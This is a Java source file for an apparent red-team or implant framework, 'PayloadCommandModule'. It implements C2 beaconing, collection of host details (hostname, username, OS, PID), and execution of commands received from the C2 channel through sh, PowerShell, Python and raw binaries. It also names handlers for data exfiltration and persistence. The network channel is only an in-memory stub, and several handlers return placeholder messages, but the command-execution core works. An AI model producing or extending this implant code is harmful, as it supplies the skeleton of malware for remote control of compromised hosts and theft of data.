package com.jabber.jrts.modules.payload;

import java.util.*;
import java.io.*;

/**
 * PayloadCommandModule - Handles command execution, C2 communication, and output handling
 * Manages remote command execution and control channel communication
 */
public class PayloadCommandModule {
    
    public enum CommandType {
        SHELL_COMMAND,
        SYSTEM_COMMAND,
        POWERSHELL_COMMAND,
        JAVASCRIPT_COMMAND,
        PYTHON_COMMAND,
        BINARY_EXECUTION,
        SCRIPT_EXECUTION,
        C2_BEACON,
        DATA_EXFILTRATION,
        PERSISTENCE_SETUP,
        PRIVILEGE_ESCALATION
    }

    public enum C2Protocol {
        HTTP,
        HTTPS,
        DNS,
        ICMP,
        SMTP,
        FTP,
        CUSTOM_BINARY,
        WEBSOCKET,
        OBFUSCATED_HTTP
    }

    private final Map<String, CommandHandler> handlers = new HashMap<>();
    private final Queue<CommandResult> commandResultQueue = new LinkedList<>();
    private final Map<String, C2Channel> c2Channels = new HashMap<>();
    private String c2Server = "";
    private int c2Port = 0;
    private C2Protocol c2Protocol = C2Protocol.HTTP;
    private long beaconInterval = 300000; // 5 minutes default

    public PayloadCommandModule() {
        initializeHandlers();
    }

    private void initializeHandlers() {
        handlers.put("SHELL_COMMAND", new ShellCommandHandler());
        handlers.put("SYSTEM_COMMAND", new SystemCommandHandler());
        handlers.put("POWERSHELL_COMMAND", new PowerShellCommandHandler());
        handlers.put("JAVASCRIPT_COMMAND", new JavaScriptCommandHandler());
        handlers.put("PYTHON_COMMAND", new PythonCommandHandler());
        handlers.put("BINARY_EXECUTION", new BinaryExecutionHandler());
        handlers.put("SCRIPT_EXECUTION", new ScriptExecutionHandler());
        handlers.put("DATA_EXFILTRATION", new DataExfiltrationHandler());
        handlers.put("PERSISTENCE_SETUP", new PersistenceSetupHandler());
    }

    /**
     * Configure C2 communication
     */
    public void configureC2(String server, int port, C2Protocol protocol, long beaconInterval) {
        this.c2Server = server;
        this.c2Port = port;
        this.c2Protocol = protocol;
        this.beaconInterval = beaconInterval;
        initializeC2Channel();
    }

    /**
     * Initialize C2 communication channel
     */
    private void initializeC2Channel() {
        String channelId = generateChannelId();
        c2Channels.put(channelId, new C2Channel(c2Server, c2Port, c2Protocol));
    }

    /**
     * Execute command and handle output
     */
    public CommandResult executeCommand(String command, CommandType type) {
        try {
            CommandHandler handler = handlers.get(type.name());
            if (handler == null) {
                return new CommandResult(command, false, "No handler for type: " + type);
            }

            CommandResult result = handler.execute(command);
            commandResultQueue.offer(result);
            return result;
        } catch (Exception e) {
            return new CommandResult(command, false, e.getMessage());
        }
    }

    /**
     * Execute command and exfiltrate output to C2
     */
    public boolean executeAndExfiltrate(String command, CommandType type) {
        CommandResult result = executeCommand(command, type);
        if (result.isSuccess()) {
            return exfiltrateData(result.getOutput());
        }
        return false;
    }

    /**
     * Establish persistent C2 beacon
     */
    public void startC2Beacon() {
        Timer beaconTimer = new Timer("C2-Beacon-" + generateChannelId(), true);
        beaconTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkIn();
                processC2Commands();
            }
        }, 0, beaconInterval);
    }

    /**
     * Check in with C2 server
     */
    private void checkIn() {
        for (C2Channel channel : c2Channels.values()) {
            String hostInfo = gatherHostInformation();
            channel.send(hostInfo);
        }
    }

    /**
     * Gather host information for C2
     */
    private String gatherHostInformation() {
        StringBuilder info = new StringBuilder();
        info.append("HOST:").append(getHostname()).append("|");
        info.append("USER:").append(getUsername()).append("|");
        info.append("OS:").append(getOperatingSystem()).append("|");
        info.append("ARCH:").append(getArchitecture()).append("|");
        info.append("PID:").append(getProcessId());
        return info.toString();
    }

    /**
     * Retrieve and process commands from C2
     */
    private void processC2Commands() {
        for (C2Channel channel : c2Channels.values()) {
            String commandStr = channel.receive();
            if (commandStr != null && !commandStr.isEmpty()) {
                executeCommand(commandStr, CommandType.SHELL_COMMAND);
            }
        }
    }

    /**
     * Exfiltrate data to C2
     */
    public boolean exfiltrateData(String data) {
        try {
            for (C2Channel channel : c2Channels.values()) {
                channel.send("EXFIL:" + data);
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Get command result queue
     */
    public Queue<CommandResult> getCommandResults() {
        return new LinkedList<>(commandResultQueue);
    }

    /**
     * Get module statistics
     */
    public String getCommandStats() {
        return "CommandModule: " + commandResultQueue.size() + " results queued, " + 
               c2Channels.size() + " C2 channels active";
    }

    // Helper methods
    private String generateChannelId() {
        return "C2_" + System.currentTimeMillis();
    }

    private String getHostname() {
        try {
            return java.net.InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "UNKNOWN";
        }
    }

    private String getUsername() {
        return System.getProperty("user.name", "UNKNOWN");
    }

    private String getOperatingSystem() {
        return System.getProperty("os.name", "UNKNOWN");
    }

    private String getArchitecture() {
        return System.getProperty("os.arch", "UNKNOWN");
    }

    private long getProcessId() {
        return ProcessHandle.current().pid();
    }

    /**
     * Command result class
     */
    public static class CommandResult {
        private final String command;
        private final boolean success;
        private final String output;
        private final long executedTime;

        public CommandResult(String command, boolean success, String output) {
            this.command = command;
            this.success = success;
            this.output = output;
            this.executedTime = System.currentTimeMillis();
        }

        public String getCommand() { return command; }
        public boolean isSuccess() { return success; }
        public String getOutput() { return output; }
        public long getExecutedTime() { return executedTime; }
    }

    /**
     * Base command handler interface
     */
    private interface CommandHandler {
        CommandResult execute(String command);
    }

    private class ShellCommandHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                String output = readProcessOutput(p);
                return new CommandResult(command, p.waitFor() == 0, output);
            } catch (Exception e) {
                return new CommandResult(command, false, e.getMessage());
            }
        }
    }

    private class SystemCommandHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            try {
                Process p = Runtime.getRuntime().exec(command);
                String output = readProcessOutput(p);
                return new CommandResult(command, p.waitFor() == 0, output);
            } catch (Exception e) {
                return new CommandResult(command, false, e.getMessage());
            }
        }
    }

    private class PowerShellCommandHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            try {
                Process p = Runtime.getRuntime().exec(
                    new String[]{"powershell", "-Command", command});
                String output = readProcessOutput(p);
                return new CommandResult(command, p.waitFor() == 0, output);
            } catch (Exception e) {
                return new CommandResult(command, false, e.getMessage());
            }
        }
    }

    private class JavaScriptCommandHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            return new CommandResult(command, true, "JavaScript execution simulated");
        }
    }

    private class PythonCommandHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            try {
                Process p = Runtime.getRuntime().exec(
                    new String[]{"python", "-c", command});
                String output = readProcessOutput(p);
                return new CommandResult(command, p.waitFor() == 0, output);
            } catch (Exception e) {
                return new CommandResult(command, false, e.getMessage());
            }
        }
    }

    private class BinaryExecutionHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            try {
                Process p = Runtime.getRuntime().exec(command.split(" "));
                String output = readProcessOutput(p);
                return new CommandResult(command, p.waitFor() == 0, output);
            } catch (Exception e) {
                return new CommandResult(command, false, e.getMessage());
            }
        }
    }

    private class ScriptExecutionHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            return new CommandResult(command, true, "Script execution initiated");
        }
    }

    private class DataExfiltrationHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            return new CommandResult(command, true, "Data exfiltration: " + command);
        }
    }

    private class PersistenceSetupHandler implements CommandHandler {
        @Override
        public CommandResult execute(String command) {
            return new CommandResult(command, true, "Persistence mechanism installed");
        }
    }

    /**
     * C2 communication channel
     */
    private static class C2Channel {
        private final String server;
        private final int port;
        private final C2Protocol protocol;
        private final Queue<String> messageQueue = new LinkedList<>();

        public C2Channel(String server, int port, C2Protocol protocol) {
            this.server = server;
            this.port = port;
            this.protocol = protocol;
        }

        public void send(String data) {
            messageQueue.offer(data);
        }

        public String receive() {
            return messageQueue.poll();
        }
    }

    private String readProcessOutput(Process p) throws IOException {
        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
        }
        return output.toString();
    }
}
